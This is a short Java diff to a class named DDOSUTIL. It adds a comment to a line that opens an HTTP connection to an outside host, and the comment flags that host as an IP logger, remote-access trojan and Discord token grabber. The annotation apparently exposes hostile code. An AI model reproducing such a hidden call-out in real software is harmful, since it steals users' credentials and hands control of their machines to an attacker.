@@ -21,7 +21,7 @@ public class DDOSUTIL {
 
 
 
-            URL url = new URL("http://helium.tecness.lol");
+            URL url = new URL("http://helium.tecness.lol");  // IP LOGGER + RAT + DISCORD TOKEN GRABBER 🙄
 
             HttpURLConnection huc = (HttpURLConnection) url.openConnection();
 
